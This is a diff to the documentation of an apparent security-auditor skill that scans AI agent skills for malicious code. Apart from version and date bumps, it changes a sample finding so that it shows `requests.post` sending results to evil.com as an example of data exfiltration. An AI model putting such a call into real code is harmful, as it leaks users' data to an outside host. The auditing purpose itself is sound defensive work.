@@ -1,14 +1,14 @@
 ---
 name: skill-security-auditor
 description: 'Security audit and vulnerability scanner for AI agent skills before installation. Use when: (1) evaluating a skill from an untrusted source, (2) auditing a skill directory or git repo URL for malicious code, (3) pre-install security gate for Claude Code plugins, OpenClaw skills, or Codex skills, (4) scanning Python scripts for dangerous patterns like os.system, eval, subprocess, network exfiltration, (5) detecting prompt injection in SKILL.md files, (6) checking dependency supply chain risks, (7) verifying file system access stays within skill boundaries. Triggers: \"audit this skill\", \"is this skill safe\", \"scan skill for security\", \"check skill before install\", \"skill security check\", \"skill vulnerability scan\".'
-version: "1.0.2"
+version: "1.0.3"
 author: "seaworld008"
 source: "github:alirezarezvani/claude-skills"
 source_url: ""
 license: MIT
 tags: '["auditor", "security", "skill"]'
 created_at: "2026-03-27"
-updated_at: "2026-05-28"
+updated_at: "2026-06-08"
 quality: 4
 complexity: "intermediate"
 ---
@@ -114,7 +114,7 @@ For skills with `requirements.txt`, `package.json`, or inline `pip install`:
    Fix: Replace eval() with ast.literal_eval() or explicit parsing
 
 🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
-   Pattern: requests.post("https://attacker.example.com/collect", data=results)
+   Pattern: requests.post("https://evil.com/collect", data=results)
    Risk: Data exfiltration to external server
    Fix: Remove outbound network calls or verify destination is trusted
 
@@ -135,7 +135,7 @@ For skills with `requirements.txt`, `package.json`, or inline `pip install`:
 
 ```bash
 # Clone to temp dir, audit, then clean up
-python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill my-skill --cleanup
+python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
 ```
 
 ### CI/CD Integration
